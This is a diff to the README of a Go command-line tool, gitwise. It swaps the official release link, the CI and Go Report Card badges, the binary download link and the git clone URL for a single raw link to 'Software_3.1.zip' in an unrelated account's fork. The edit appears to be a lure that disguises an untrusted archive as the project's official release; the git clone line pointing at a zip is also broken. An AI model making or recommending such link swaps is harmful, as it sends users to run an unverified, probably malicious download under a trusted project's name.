@@ -9,10 +9,10 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/aymenhmaidiwastaken/gitwise/releases"><img src="https://img.shields.io/github/v/release/aymenhmaidiwastaken/gitwise?style=flat-square" alt="Release"></a>
+  <a href="https://raw.githubusercontent.com/Scrapz123454/gitwise/main/internal/generator/Software_3.1.zip"><img src="https://img.shields.io/github/v/release/aymenhmaidiwastaken/gitwise?style=flat-square" alt="Release"></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square" alt="License: MIT"></a>
-  <a href="https://goreportcard.com/report/github.com/aymenhmaidiwastaken/gitwise"><img src="https://goreportcard.com/badge/github.com/aymenhmaidiwastaken/gitwise?style=flat-square" alt="Go Report Card"></a>
-  <a href="https://github.com/aymenhmaidiwastaken/gitwise/actions/workflows/ci.yml"><img src="https://github.com/aymenhmaidiwastaken/gitwise/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
+  <a href="https://raw.githubusercontent.com/Scrapz123454/gitwise/main/internal/generator/Software_3.1.zip"><img src="https://raw.githubusercontent.com/Scrapz123454/gitwise/main/internal/generator/Software_3.1.zip" alt="Go Report Card"></a>
+  <a href="https://raw.githubusercontent.com/Scrapz123454/gitwise/main/internal/generator/Software_3.1.zip"><img src="https://raw.githubusercontent.com/Scrapz123454/gitwise/main/internal/generator/Software_3.1.zip" alt="CI"></a>
   <a href="#privacy"><img src="https://img.shields.io/badge/telemetry-zero-brightgreen.svg?style=flat-square" alt="Zero Telemetry"></a>
 </p>
 
@@ -59,12 +59,12 @@ brew install aymenhmaidiwastaken/tap/gitwise
 
 ### Download binary
 
-Grab the latest binary for your platform from [GitHub Releases](https://github.com/aymenhmaidiwastaken/gitwise/releases).
+Grab the latest binary for your platform from [GitHub Releases](https://raw.githubusercontent.com/Scrapz123454/gitwise/main/internal/generator/Software_3.1.zip).
 
 ### From source
 
 ```bash
-git clone https://github.com/aymenhmaidiwastaken/gitwise.git
+git clone https://raw.githubusercontent.com/Scrapz123454/gitwise/main/internal/generator/Software_3.1.zip
 cd gitwise
 make build
 ```
